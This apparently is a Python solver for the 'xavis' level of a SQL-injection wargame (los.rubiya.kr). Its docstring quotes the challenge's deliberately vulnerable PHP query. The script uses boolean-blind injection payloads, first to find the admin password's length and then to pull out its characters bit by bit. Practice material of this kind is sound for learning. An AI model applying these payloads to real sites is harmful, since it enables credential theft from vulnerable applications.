#!/usr/bin/env python3
import los
import los_cookies as lc


def check_func(*args) -> bool:
    """
    check string in response of request
    args[0]: response
    """
    return 'Hello admin' in args[0]


def main():
    """
    Xavis

    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
    if(preg_match('/regex|like/i', $_GET[pw])) exit("HeHe");
    $query = "select id from prob_xavis where id='admin' and pw='{$_GET[pw]}'";
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if($result['id']) echo "<h2>Hello {$result[id]}</h2>";

    $_GET[pw] = addslashes($_GET[pw]);
    $query = "select pw from prob_xavis where id='admin' and pw='{$_GET[pw]}'";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("xavis");
    """

    url = "https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php"
    cook = lc.check_cookies(url)
    method = 'get'
    inj_param = 'pw'

    payload = "'||length(pw)>%s#"
    p = los.SqlInjection(url, cook, method, inj_param, payload)
    len_of_key = p.find_key_len(check_func)

    # Unicode len 32 bit
    unicode_len_bit = 32

    p.payload = "'||mid(lpad(bin(ord(mid(pw,%s1,1))),%s2,0),%s3,1)=1#"
    result = p.find_pass_over_bits(check_func, len_of_key, unicode_len_bit)

    p.payload = result
    response = p.my_request()

    if 'Clear!' in response:
        print('\nXavis Clear!')


if __name__ == '__main__':
    main()
